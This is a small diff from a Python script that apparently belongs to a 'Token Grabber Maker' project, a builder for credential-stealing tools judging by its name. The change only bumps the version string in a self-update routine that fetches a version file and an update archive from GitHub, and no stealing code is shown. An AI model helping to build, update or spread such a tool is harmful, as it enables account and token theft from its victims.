@@ -10,7 +10,7 @@ import sys
 def build():
     version = requests.get("https://raw.githubusercontent.com/Teobre/TokenGrabberMaker/main/Files/version")
     ctypes.windll.kernel32.SetConsoleTitleW(f"Token Grabber Maker | Version {version.text} | Créé par Teobre#0787")
-    if version.text != "1.0.2\n":
+    if version.text != "1.0.3\n":
         print("Une nouvelle version est disponible, le téléchargement est en cours.")
         ctypes.windll.kernel32.SetConsoleTitleW(f"Token Grabber Maker | Mise à jour en cours... | Créé par Teobre#0787")
         new_version = requests.get("https://github.com/Teobre/TokenGrabberMaker/archive/main.zip")
